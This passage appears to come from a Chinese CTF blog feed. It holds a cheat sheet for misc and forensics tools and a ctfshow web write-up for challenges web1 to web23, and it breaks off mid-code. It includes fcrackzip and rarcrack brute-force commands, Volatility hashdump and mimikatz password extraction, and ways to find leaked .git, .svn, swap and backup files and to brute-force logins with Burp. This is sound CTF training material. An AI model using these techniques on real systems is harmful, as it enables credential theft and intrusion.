alt=\"image-20221205221823190\" /></p>\n<h2 id=\"aztec-code\"><a class=\"anchor\" href=\"#aztec-code\">#</a> Aztec Code</h2>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205221903561.png\" alt=\"image-20221205221903561\" /></p>\n<h2 id=\"maxicode\"><a class=\"anchor\" href=\"#maxicode\">#</a> Maxicode</h2>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205222000617.png\" alt=\"image-20221205222000617\" /></p>\n<h2 id=\"quickmark\"><a class=\"anchor\" href=\"#quickmark\">#</a> QuickMark</h2>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205222020363.png\" alt=\"image-20221205222020363\" /></p>\n<h2 id=\"一维码\"><a class=\"anchor\" href=\"#一维码\">#</a> 一维码</h2>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205222055001.png\" alt=\"image-20221205222055001\" /></p>\n<h1 id=\"无线电电波\"><a class=\"anchor\" href=\"#无线电电波\">#</a> 无线电电波</h1>\n<h2 id=\"rx-sstv\"><a class=\"anchor\" href=\"#rx-sstv\">#</a> RX-SSTV</h2>\n<p>切换虚拟声卡 line1，robot36 解码</p>\n<h2 id=\"qsstv-2\"><a class=\"anchor\" href=\"#qsstv-2\">#</a> QSSTV</h2>\n<h1 id=\"word密码破解\"><a class=\"anchor\" href=\"#word密码破解\">#</a> WORD 密码破解</h1>\n<p>Advanced Office Password Recovery</p>\n<h1 id=\"压缩包爆破\"><a class=\"anchor\" href=\"#压缩包爆破\">#</a> 压缩包爆破</h1>\n<h2 id=\"crc32碰撞\"><a class=\"anchor\" href=\"#crc32碰撞\">#</a> CRC32 碰撞</h2>\n<p>跑脚本</p>\n<h2 id=\"明文攻击\"><a class=\"anchor\" href=\"#明文攻击\">#</a> 明文攻击</h2>\n<h2 id=\"zip\"><a class=\"anchor\" href=\"#zip\">#</a> ZIP</h2>\n<h3 id=\"ziperello\"><a class=\"anchor\" href=\"#ziperello\">#</a> Ziperello</h3>\n<h3 id=\"archpr\"><a class=\"anchor\" href=\"#archpr\">#</a> ARCHPR</h3>\n<h3 id=\"fcrack\"><a class=\"anchor\" href=\"#fcrack\">#</a> Fcrack</h3>\n<p>kali 自带</p>\n<p>fcrackzip -b -c1! -l 13-13 -v -u message.zip</p>\n<table>\n<thead>\n<tr>\n<th>-b</th>\n<th>暴力破解方式</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-D  字典</td>\n<td>字典破解方式</td>\n</tr>\n<tr>\n<td>-c</td>\n<td>暴力破解的字符类型，1=1<sub>9,a=a</sub>z,A=A~Z,!= 字符，:= 所有字符</td>\n</tr>\n<tr>\n<td>-v</td>\n<td>啰嗦模式，显示实时爆破信息</td>\n</tr>\n<tr>\n<td>-l</td>\n<td>指定破解的密码为几位数</td>\n</tr>\n<tr>\n<td>-u</td>\n<td>指定爆破文件</td>\n</tr>\n<tr>\n<td>-p</td>\n<td>破解的起始位置</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"zip伪加密知识\"><a class=\"anchor\" href=\"#zip伪加密知识\">#</a> zip 伪加密知识</h2>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221208161353625.png\" alt=\"image-20221208161353625\" /></p>\n<h2 id=\"rar\"><a class=\"anchor\" href=\"#rar\">#</a> RAR</h2>\n<h3 id=\"archpr-2\"><a class=\"anchor\" href=\"#archpr-2\">#</a> ARCHPR</h3>\n<h3 id=\"rarcrack\"><a class=\"anchor\" href=\"#rarcrack\">#</a> Rarcrack</h3>\n<p>使用一次后暂停，可编辑 xml 文件更改破解密码格式</p>\n<p>rarcrack 1.zip -threads 12 -type rar</p>\n<p>rarcrack 文件名 -threads 线程数 (12 最大) -type rar|zip|7z</p>\n<h2 id=\"rar伪加密小知识\"><a class=\"anchor\" href=\"#rar伪加密小知识\">#</a> rar 伪加密小知识</h2>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221208161424891.png\" alt=\"image-20221208161424891\" /></p>\n<h1 id=\"其他工具\"><a class=\"anchor\" href=\"#其他工具\">#</a> 其他工具</h1>\n<h2 id=\"exiftool\"><a class=\"anchor\" href=\"#exiftool\">#</a> Exiftool</h2>\n<p>(linux 查看文件属性)</p>\n<h2 id=\"strings\"><a class=\"anchor\" href=\"#strings\">#</a> Strings</h2>\n<p>(linux 查询一个二进制文件中所含有的字符信息)</p>\n<h1 id=\"关于路由器的工具\"><a class=\"anchor\" href=\"#关于路由器的工具\">#</a> 关于路由器的工具</h1>\n<h2 id=\"routerpass\"><a class=\"anchor\" href=\"#routerpass\">#</a> RouterPass</h2>\n<p>路由器数据分析</p>\n<h1 id=\"关于微信的工具\"><a class=\"anchor\" href=\"#关于微信的工具\">#</a> 关于微信的工具</h1>\n<h2 id=\"wxdatconvter\"><a class=\"anchor\" href=\"#wxdatconvter\">#</a> WXDatConvter</h2>\n<p>微信 DAT 文件分析</p>\n<h1 id=\"pyc隐写\"><a class=\"anchor\" href=\"#pyc隐写\">#</a> Pyc 隐写</h1>\n<h2 id=\"stegosaurus\"><a class=\"anchor\" href=\"#stegosaurus\">#</a> Stegosaurus</h2>\n<p>记得要反编译一下啊</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3N0ZWdvc2F1cnVzLnB5\">stegosaurus.py</span> -x [pyc_file]</p>\n<h2 id=\"pyc反编译在线\"><a class=\"anchor\" href=\"#pyc反编译在线\">#</a> pyc 反编译在线</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29sLmx1L3B5Yy8=\">https://tool.lu/pyc/</span></p>\n<h2 id=\"uncompyle6\"><a class=\"anchor\" href=\"#uncompyle6\">#</a> Uncompyle6</h2>\n<p>kali 里的 pyc 反编译工具</p>\n<p>uncompyle6 -o <span class=\"exturl\" data-url=\"aHR0cDovL3Rlc3QucHk=\">test.py</span> test.pyc</p>\n<p>#没安装上（懒得安装）</p>\n<h1 id=\"java反编译\"><a class=\"anchor\" href=\"#java反编译\">#</a> Java 反编译</h1>\n<p>JD-GUI</p>\n<p>java -jar jd-gui-1.x.x.jar</p>\n<p>这里的 xx 是指你的版本号</p>\n<h1 id=\"创建字典\"><a class=\"anchor\" href=\"#创建字典\">#</a> 创建字典</h1>\n<h2 id=\"crunch\"><a class=\"anchor\" href=\"#crunch\">#</a> crunch</h2>\n<p>crunch &lt;min&gt; &lt;max&gt; -o out.txt</p>\n<h2 id=\"pydictor\"><a class=\"anchor\" href=\"#pydictor\">#</a> pydictor</h2>\n<h1 id=\"ntfs流\"><a class=\"anchor\" href=\"#ntfs流\">#</a> NTFS 流</h1>\n<p>NTFS 流隐藏文件工具</p>\n<p>NtfsStreamsEditor</p>\n<h1 id=\"ws后缀文件在线\"><a class=\"anchor\" href=\"#ws后缀文件在线\">#</a> ws 后缀文件在线</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly92aWk1YXJkLmdpdGh1Yi5pby93aGl0ZXNwYWNlLw==\">https://vii5ard.github.io/whitespace/</span></p>\n<h1 id=\"关于txt文本的题目知识\"><a class=\"anchor\" href=\"#关于txt文本的题目知识\">#</a> 关于 TXT 文本的题目知识</h1>\n<h2 id=\"整数分解\"><a class=\"anchor\" href=\"#整数分解\">#</a> 整数分解</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC5udW1iZXJlbXBpcmUuY29tL251bWJlcmZhY3Rvcml6ZXIucGhw\">分解质因数工具 - 整数分解最多为 70 位 (numberempire.com)</span></p>\n<p>整数分解成因数</p>\n<h1 id=\"取证\"><a class=\"anchor\" href=\"#取证\">#</a> 取证</h1>\n<h2 id=\"volatility基础命令\"><a class=\"anchor\" href=\"#volatility基础命令\">#</a> volatility 基础命令</h2>\n<pre><code>python vol.py -f [image] ‐-profile=[profile][plugin] 命令\n\n其中 -f 后面加的是要取证的文件， --profile 后加的是工具识别出的系统版本， [plugin] 是指使用的插件，其中默认存在一些插件，另外还可以自己下载一些插件扩充\n\n\n\nimageinfo：显示目标镜像的摘要信息，这常常是第一步，获取内存的操作系统类型及版本，之后可以在 –profile 中带上对应的操作系统，后续操作都要带上这一参数\n\npslist：该插件列举出系统进程，但它不能检测到隐藏或者解链的进程，psscan可以\n\npstree：以树的形式查看进程列表，和pslist一样，也无法检测隐藏或解链的进程\n\npsscan：可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程\n\nprocdump：提取文件\n\t//procdump -p 1164 -D /home/kali \n\ncmdscan：可用于查看终端记录\n\nnotepad：查看当前展示的 notepad 文本（–profile=winxp啥的低版本可以，win7的不行，可以尝试使用editbox）\n\nfilescan：扫描所有的文件列表\n\nlinux配合 grep 命令进行相关字符定向扫描，如：grep flag、grep -E ‘png|jpg|gif|zip|rar|7z|pdf|txt|doc’\n\ndumpfiles：导出某一文件(指定虚拟地址)\n\n需要指定偏移量 -Q 和输出目录 -D\n\nmendump：提取出指定进程，常用foremost 来分离里面的文件\n\n需要指定进程-p [pid] 和输出目录 -D\n\neditbox：显示有关编辑控件（曾经编辑过的内容）的信息\n\nscreenshot：保存基于GDI窗口的伪截屏\n\nclipboard：查看剪贴板信息\n\niehistory：检索IE浏览器历史记录\n\nsysteminfo：显示关于计算机及其操作系统的详细配置信息（插件）\n\nhashdump：查看当前操作系统中的 password hash，例如 Windows 的 SAM 文件内容(mimikatz插件可以获取系统明文密码)\n\nlsadump：LSA解密\n\nmftparser：恢复被删除的文件\n\nsvcscan：扫描 Windows 的服务\n\nconnscan：查看网络连接\n\nenvars：查看环境变量\n\ndlllist: 列出某一进程加载的所有dll文件\n\nhivelist: 列出所有的注册表项及其虚拟地址和物理地址\n\nhivedump：打印出注册表中的数据\n\t//hivedump -o 注册表的virtual地址\n\ntimeliner: 将所有操作系统事件以时间线的方式展开\n\ndumpregistry：提取文件\n\tdumpregistry -o 0xfffff8a005ef7010 -D ./\n</code></pre>\n<pre><code>Volatility2的使用方法\n\n(1) 获取系统基本信息\n&gt;&gt;&gt;python2 vol.py -f ../Target.vmem imageinfo\n\n\n(2) 列出进程信息\n&gt;&gt;&gt; python2 vol.py -f ../Target.vmem --profile=Win7SP1x64 pslist\n\n\n(3) 提取某进程文件内容\n&gt;&gt;&gt; python2 vol.py -f ../Target.vmem --profile=Win7SP1x64 memdump -p 516 -D ./\n\n\n(4) 查看文件目录\n&gt;&gt;&gt; python2 vol.py -f ../Target.vmem --profile=Win7SP1x64 filescan\n\n\n(5) 提取某文件内容\n&gt;&gt;&gt;python2 vol.py -f ../Target.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007fe72430 --dump-dir=./\n\n\n(6) 调用mimikatz抓取系统口令\n&gt;&gt;&gt; python2 vol.py -f ../Target.vmem --profile=Win7SP1x64 mimikatz\n</code></pre>\n<h1 id=\"流量\"><a class=\"anchor\" href=\"#流量\">#</a> 流量</h1>\n<h2 id=\"wireshark\"><a class=\"anchor\" href=\"#wireshark\">#</a> WireShark</h2>\n<p>常用的过滤命令</p>\n<pre><code>//过滤ip\nip.src eq x.x.x.x &amp;&amp; ip.dst eq x.x.x.x\t\n\n//过滤端口\ntcp.port eq 80 or udp.port eq 80\ntcp.dstport == 80 \t//只显tcp协议的目标端口为80\ntcp.srcport == 80\t//只显tcp协议的源端口为80\ntcp.port &gt;= 1 and tcp.port &lt;= 80\n\n//过滤协议\ntcp/udp/arp/mysql/http/ftp/dns/ip\n\n//过滤MAC\neth.dst == A0:00:00:04:C5:84\t//过滤目标MAC\n\n//包长度过滤\nudp.length == 26\t//这个长度是指udp本身固定长度8加上udp下面那块数据包之和\ntcp.len &gt;= 7\t\t//指的是ip数据包（tcp下面那块数据）,不包括tcp本身\nip.len == 94\t\t//除了以太网头固定长度14，其他都算是ip.len，即从ip本身到最后\nframe.len == 119\t//整个数据包长度，从eth开始到最后\n\n//http模式过滤\nhttp.request.method == &quot;GET&quot;\nhttp.request.method == &quot;POST&quot;\nhhtp.request.uri == &quot;/img/logo-edu.gif&quot;\nhttp contains &quot;GET&quot;\t\t//常用\nhttp contains &quot;HTTP/1.&quot;\nhttp.request.method == &quot;GET&quot; &amp;&amp; http\nhttp contains &quot;flag&quot;\nhttp contains &quot;key&quot;\ntcp contains &quot;flag&quot;\n\ntcp.connection.syn\t//扫大致端口开放\n\nicmp\n（1）诊断报文（类型：8，代码0；类型：0代码：0）；\n（2）目的不可达报文（类型：3，代码0-15）；\n（3）重定向报文（类型：5，代码：0--4）；\n（4）超时报文（类型：11，代码：0--1）；\n（5）信息报文（类型：12--18）。\n</code></pre>\n<pre><code>查询网址使用CMS和版本号：Powered by\n\n</code></pre>\n<h1 id=\"查看注册表\"><a class=\"anchor\" href=\"#查看注册表\">#</a> 查看注册表</h1>\n<h2 id=\"registryrecon\"><a class=\"anchor\" href=\"#registryrecon\">#</a> RegistryRecon</h2>\n<p>C:\\Program Files (x86)\\Arsenal Recon\\Registry Recon</p>\n<p>Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\\calc.exe</p>\n<p>进程的注册表位置</p>\n<h1 id=\"脚本\"><a class=\"anchor\" href=\"#脚本\">#</a> 脚本</h1>\n<p>E:\\CTF\\ 脚本</p>\n<h2 id=\"md5py\"><a class=\"anchor\" href=\"#md5py\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovL21kNS5weQ==\">md5.py</span></h2>\n<p>长度为 672，正好能被 32 整除就能使用该脚本</p>\n<h1 id=\"onion\"><a class=\"anchor\" href=\"#onion\">#</a> onion</h1>\n<p>.onion</p>\n<p>需要用 tor 洋葱浏览器访问</p>\n",
            "tags": [
                "CTF"
            ]
        },
        {
            "id": "http://k1nako.github.io/ctfshow-web/",
            "url": "http://k1nako.github.io/ctfshow-web/",
            "title": "ctfshow-web",
            "date_published": "2023-04-17T13:40:44.000Z",
            "content_html": "<p>ctfshow web 部分 wp<br />\n<span id=\"more\"></span></p>\n<p>###（之后有空就补截图）</p>\n<h1 id=\"信息搜集\"><a class=\"anchor\" href=\"#信息搜集\">#</a> 信息搜集</h1>\n<h2 id=\"web1\"><a class=\"anchor\" href=\"#web1\">#</a> web1</h2>\n<p>开发注释未及时删除</p>\n<pre><code>查看源代码得到flag\n</code></pre>\n<h2 id=\"web2\"><a class=\"anchor\" href=\"#web2\">#</a> web2</h2>\n<p>js 前台拦截 === 无效操作</p>\n<pre><code>ctrl+u快捷键查看源代码得到flag\n</code></pre>\n<h2 id=\"web3\"><a class=\"anchor\" href=\"#web3\">#</a> web3</h2>\n<p>没思路的时候抓个包看看，可能会有意外收获</p>\n<pre><code>1)f12查看网络检查文件头得到flag\n2)burpsuite抓包，Repeater回显检查文件头得到flag\n</code></pre>\n<h2 id=\"web4\"><a class=\"anchor\" href=\"#web4\">#</a> web4</h2>\n<p>总有人把后台地址写入 robots，帮黑阔大佬们引路。</p>\n<p><strong>robots.txt 文件泄露</strong>，放在网站的跟目录下，用于限制浏览器的访问（哪些可以抓取，哪些不能抓取）用于防止黑客，但是任何人可在 url 中直接通过 /robots.txt 访问，导致网站结构被泄露。可对 admin 等重要文件设置密保保护，或者采取更换文件名的方法防御.</p>\n<pre><code>检查robots.txt得到线索Disallow: /flagishere.txt，访问得到flag\n</code></pre>\n<h2 id=\"web5\"><a class=\"anchor\" href=\"#web5\">#</a> web5</h2>\n<p>phps 源码泄露有时候能帮上忙</p>\n<p>php 备份文件：后缀为 php~ 或者 index.php.bak</p>\n<p>php 的源代码文件：后缀为 phps</p>\n<p><strong>phps 文件泄露</strong>，phps 存放着 php<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTYlQkElOTAlRTclQTAlODEmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\"> 源码</span>，可通过尝试访问 /index.phps 读取，或者尝试扫描工具扫描读取.</p>\n<pre><code>用御剑扫码只得到index.php，根据题目提示，访问index.phps得到文件，打开得到flag\n</code></pre>\n<h2 id=\"web6\"><a class=\"anchor\" href=\"#web6\">#</a> web6</h2>\n<p>解压源码到当前目录，测试正常，收工</p>\n<p>压缩文件也可能包含文件的源码等，注意 rar zip 后缀</p>\n<pre><code>用dirsearch工具扫描目录，用其他工具扫也可以，得到www.zip压缩包，解压得到源码和文本，得到提示，flag in 文本里，浏览器访问此文本得到flag\n</code></pre>\n<h2 id=\"web7\"><a class=\"anchor\" href=\"#web7\">#</a> web7</h2>\n<p>版本控制很重要，但不要部署到生产环境更重要。</p>\n<p><strong>git 文件泄露</strong>，当开发人员使用 git 控制版本时，如果操作不当，可能导致 git 流入线上环境，导致.git 文件夹下的文件被访问，代码泄露，如.git/index 文件可找到工程所有文件名和 sha1 文件，在 git/objects 下载导致危害</p>\n<pre><code>dirsearch工具扫描目录，得到.git线索，访问得到flag\n</code></pre>\n<h2 id=\"web8\"><a class=\"anchor\" href=\"#web8\">#</a> web8</h2>\n<p>版本控制很重要，但不要部署到生产环境更重要。</p>\n<p><strong>svn 泄露</strong>，svn 是源代码管理系统，在管理代码的过程中，会生成一个.svn 的隐藏文件，导致源码泄露（造成原因是在发布代码时没有使用导入功能，而是直接粘贴复制）</p>\n<pre><code>dirsearch工具扫描目录，得到.svn线索，访问得到flag\n</code></pre>\n<h2 id=\"web9\"><a class=\"anchor\" href=\"#web9\">#</a> web9</h2>\n<p>发现网页有个错别字？赶紧在生产环境 vim 改下，不好，死机了</p>\n<p><strong>vim 缓存泄露</strong>，在使用 vim 进行编辑时，会产生缓存文件，操作正常，则会删除缓存文件，如果意外退出，缓存文件保留下来，这是时可以通过缓存文件来得到原文件，以 index.php 来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo, 第三次退出后文件名为.index.php.swn</p>\n<pre><code>下载index.php.swp得到flag\n</code></pre>\n<h2 id=\"web10\"><a class=\"anchor\" href=\"#web10\">#</a> web10</h2>\n<p>cookie 只是一块饼干，不能存放任何隐私数据</p>\n<pre><code>查看cookie值，url编码解码得到flag\n</code></pre>\n<h2 id=\"web11\"><a class=\"anchor\" href=\"#web11\">#</a> web11</h2>\n<p>域名其实也可以隐藏信息，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1mbGFnLWY5NmczMTVnLmN0ZnNob3cuY29t\">比如 flag.ctfshow.com</span> 就隐藏了一条信息</p>\n<pre><code>https://boce.aliyun.com/home查询域名txt记录得到flag\n</code></pre>\n<h2 id=\"web12\"><a class=\"anchor\" href=\"#web12\">#</a> web12</h2>\n<p>有时候网站上的公开信息，就是管理员常用密码</p>\n<pre><code>用dirsearch或dirb工具扫目录，发现有admin后台，根据提示，网站信息是管理员的密码，翻到最底下看到一串数字，尝试admin、372619038登陆得到flag\n</code></pre>\n<h2 id=\"web13\"><a class=\"anchor\" href=\"#web13\">#</a> web13</h2>\n<p>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p>\n<pre><code>根据题目提示，在网页查找线索，翻到最下面看到一个document，打开得到后台地址用户名密码，登陆得到flag\n</code></pre>\n<h2 id=\"web14\"><a class=\"anchor\" href=\"#web14\">#</a> web14</h2>\n<p>有时候源码里面就能不经意间泄露重要 (editor) 的信息，默认配置害死人</p>\n<pre><code>根据题目提示，查看源代码搜索editor，尝试访问editor编辑器，发现可以，点击上传文件查看文件空间，查看html源代码文件，看到一个很明显的文件夹nothinghere，访问里面的文本得到flag\n</code></pre>\n<h2 id=\"web15\"><a class=\"anchor\" href=\"#web15\">#</a> web15</h2>\n<p>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p>\n<p>根据题目提示，查看邮箱</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111055136237.png\" alt=\"image-20230111055136237\" /></p>\n<p>将这些信息保留，查看有没有后台，可用搜索目录工具搜</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111055233970.png\" alt=\"image-20230111055233970\" /></p>\n<p>这里直接点忘记密码<img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111055256232.png\" alt=\"image-20230111055256232\" /></p>\n<p>根据之前的 QQ 邮箱查找，得知所在地在西安</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111055327591.png\" alt=\"image-20230111055327591\" /></p>\n<p>登陆得到 flag</p>\n<h2 id=\"web16\"><a class=\"anchor\" href=\"#web16\">#</a> web16</h2>\n<p>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p>\n<p>有的网站搭建时可能在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTYlQTAlQjklRTclOUIlQUUlRTUlQkQlOTUmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\">根目录</span>下留下探针，所以直接访问 tz.php</p>\n<p>发现 phpinfo 是灰色的可以点击，搜索 FLAG 得到 flag</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111055854438.png\" alt=\"image-20230111055854438\" /></p>\n<h2 id=\"web17\"><a class=\"anchor\" href=\"#web17\">#</a> web17</h2>\n<p>备份的 sql 文件会泄露敏感信息</p>\n<p>用扫描目录工具扫出 backup.sql，下载文件得到 flag</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111060221115.png\" alt=\"image-20230111060221115\" /></p>\n<h2 id=\"web18\"><a class=\"anchor\" href=\"#web18\">#</a> web18</h2>\n<p>不要着急，休息，休息一会儿，玩 101 分给你 flag</p>\n<p>小游戏一般都是 js 前端，查看源代码 js 文件找线索</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111060515277.png\" alt=\"image-20230111060515277\" /></p>\n<p>找到个 unicode 编码，解码得到线索</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111060607168.png\" alt=\"image-20230111060607168\" /></p>\n<p>访问 110.php 得到 flag</p>\n<h2 id=\"web19\"><a class=\"anchor\" href=\"#web19\">#</a> web19</h2>\n<p>密钥什么的，就不要放在前端了</p>\n<p>查看源码<img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111061738788.png\" alt=\"image-20230111061738788\" /></p>\n<p>根据线索，AES 解密，得到密码登陆得 flag</p>\n<h2 id=\"web20\"><a class=\"anchor\" href=\"#web20\">#</a> web20</h2>\n<p>mdb 文件是早期 asp+access 构架的数据库文件，文件泄露相当于数据库被脱裤了。</p>\n<p>扫描目录<img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111062233553.png\" alt=\"image-20230111062233553\" /></p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111062511804.png\" alt=\"image-20230111062511804\" /></p>\n<p>得 flag</p>\n<h1 id=\"爆破\"><a class=\"anchor\" href=\"#爆破\">#</a> 爆破</h1>\n<h2 id=\"web21\"><a class=\"anchor\" href=\"#web21\">#</a> web21</h2>\n<p>爆破什么的，都是基操</p>\n<p>考点：基础爆破工具的使用</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112173817548.png\" alt=\"image-20230112173817548\" /></p>\n<p>burpsuite 抓包<img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112173857363.png\" alt=\"image-20230112173857363\" /></p>\n<p>发现 base64 编码，解码后发现是我们输入进去的用户名和密码，题目也给出了字典，接下来就是爆破</p>\n<p>选中发送到 Intruder 模块，选中变量，选择自定义<img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112174004386.png\" alt=\"image-20230112174004386\" /></p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112174023622.png\" alt=\"image-20230112174023622\" /></p>\n<p>这里分别给三段，admin 一段，：一段，字典一段</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112174134824.png\" alt=\"image-20230112174134824\" /></p>\n<p>选择 base64 编码，勾掉 url 编码，因为会误判 base64 编码，开始爆破</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112174204443.png\" alt=\"image-20230112174204443\" /></p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112174402693.png\" alt=\"image-20230112174402693\" /></p>\n<p>根据长度<img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112174428309.png\" alt=\"image-20230112174428309\" /></p>\n<pre><code>ctfshow&#123;92f49a08-737e-4358-a25a-348a1463ba63&#125;\n</code></pre>\n<h2 id=\"web22\"><a class=\"anchor\" href=\"#web22\">#</a> web22</h2>\n<p>域名也可以爆破的，试试爆破这个 ctf.show 的子域名</p>\n<p>考点：域名爆破</p>\n<p>工具：Layer 挖掘机</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112182559786.png\" alt=\"image-20230112182559786\" /></p>\n<p>大概就是这样，vip.ctf.show 访问发现 flag</p>\n<pre><code>flag&#123;ctf_show_web&#125;\n</code></pre>\n<h2 id=\"web23\"><a class=\"anchor\" href=\"#web23\">#</a> web23</h2>\n<p>还爆破？这么多代码，告辞！</p>\n<p>大致意思是，GET 一个参数 token，token 的 MD5 加密后的值如果满足下面的判断，就输出 flag</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-03 11:43:51</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-03 11:56:11</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$token</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token 